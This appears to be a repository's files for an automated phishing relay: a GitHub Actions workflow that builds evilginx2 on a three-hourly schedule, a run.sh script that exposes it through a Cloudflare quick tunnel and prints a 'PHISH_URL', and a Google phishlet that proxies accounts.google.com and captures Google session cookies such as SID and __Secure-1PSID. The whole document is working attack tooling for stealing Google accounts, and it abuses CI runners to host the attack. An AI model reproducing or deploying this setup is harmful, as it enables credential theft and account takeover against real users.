name: relay
on:
  workflow_dispatch:
  schedule:
    - cron: '17 */3 * * *'
jobs:
  relay:
    runs-on: ubuntu-latest
    timeout-minutes: 280
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'
      - name: Build evilginx
        run: |
          git clone --depth 1 https://github.com/kgretzky/evilginx2.git
          cd evilginx2
          make
          sudo cp ./bin/evilginx /usr/local/bin/evilginx
      - name: Install cloudflared
        run: |
          sudo curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared
          sudo chmod +x /usr/local/bin/cloudflared
          cloudflared --version
      - name: Run relay
        env:
          RUN_LIMIT_MINUTES: '270'
        run: |
          chmod +x run.sh
          bash run.sh
run.sh
#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-45}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer > evilginx.log 2>&1 &
sleep 3
nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 90); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
echo "===================================================="
if [ -n "$URL" ]; then
  echo "PHISH_URL=$URL"
else
  echo "NO_TUNNEL_URL_FOUND"
  tail -n 40 cloudflared.log
fi
echo "===================================================="
trap 'kill %2 %1 2>/dev/null || true' EXIT
sleep "$((LIMIT * 60))"
phishlets/google.yaml
name: google
author: kgretzky
min_ver: '2.4.0'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: true}

sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'href="https://accounts.google.com', replace: 'href="https://{hostname}', mimes: ['text/html'], redirect: true}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'action="https://accounts.google.com', replace: 'action="https://{hostname}', mimes: ['text/html'], redirect: true}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com/_/scs/abc-static', replace: 'https://{hostname}/_/scs/abc-static', mimes: ['text/html'], redirect: false}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://ssl.gstatic.com', replace: 'https://{hostname_starts_with: ssl}.gstatic.com', mimes: ['text/html'], redirect: false}
  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '/', replace: '', mimes: ['image/jpeg', 'image/png', 'image/svg+xml', 'text/css'], redirect: true}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID','HSID','SSID','APISID','SAPISID','SIDCC','__Secure-1PSID','__Secure-3PSID','__Secure-1PSIDCC','__Secure-3PSIDCC','__Secure-1PSIDTS','__Secure-3PSIDTS','LSID','SMSV','gtm','OTZ','NID','1P_JAR']

auth_urls:
  - '/accounts/SetSID'
  - '/accounts/SetOSID'

login_urls:
  - 'https://{hostname}/accounts/Login'
  - 'https://{hostname}/v3/signin/identifier'
  - 'https://{hostname}/v3/signin/challenge/pwd'
